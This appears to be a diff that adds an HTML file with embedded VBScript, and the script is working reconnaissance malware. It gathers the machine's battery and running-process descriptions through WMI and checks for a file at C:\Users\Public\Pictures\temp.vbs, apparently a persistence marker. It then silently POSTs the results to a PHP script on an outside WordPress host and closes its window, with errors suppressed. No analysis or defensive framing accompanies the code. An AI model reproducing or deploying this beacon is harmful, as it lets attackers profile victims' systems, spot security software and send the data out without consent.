@@ -1,0 +1,59 @@
+<html><script language="VBScript">
+Dim isProcessRunning
+Dim Result
+
+Function Modi(a0)
+    Modi = ""
+    For ix = 1 To Len(a0)
+        aa = Mid(a0, ix, 1)
+        bb = "_"
+        If Asc(aa) > 47 And Asc(aa) < 58 Then
+            bb = aa
+        End If
+        If Asc(aa) > 64 And Asc(aa) < 91 Then
+            bb = aa
+        End If
+        If Asc(aa) > 96 And Asc(aa) < 123 Then
+            bb = aa
+        End If
+        If Asc(aa) = 46 Then
+            bb = aa
+        End If
+        Modi = Modi + bb
+    Next
+End Function
+
+On Error Resume Next
+Result=""
+isProcessRunning = ""
+Set ws = CreateObject("WScript.Shell")
+Set WMI = GetObject("WinMgmts:")
+Set Objs = WMI.InstancesOf("Win32_Battery")
+Set fs = CreateObject("Scripting.FileSystemObject")
+
+For Each Obj In Objs
+  isProcessRunning = isProcessRunning & Obj.Description & " "
+Next
+
+Set Objs = WMI.InstancesOf("Win32_Process")
+For Each Obj In Objs
+  isProcessRunning = isProcessRunning & Obj.Description & " "
+Next
+
+isProcessRunning=LCase(isProcessRunning)
+
+If fs.FileExists("C:\Users\Public\Pictures\temp.vbs") Then
+	Result = Result+"sch vbs ok "+"ENTER"
+Else
+	Result = Result+"sch vbs no "+"ENTER"
+End If
+
+Result = Result + isProcessRunning + "ENTER"
+
+Set Post0 = CreateObject("msxml2.xmlhttp")
+Post0.Open "POST", "https://orientedworld.com/wp-content/plugins/health-check/pages/gorgon1/r.php", 0
+Post0.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+Post0.Send (Modi(Result))
+
+window.close()
+</script></html>
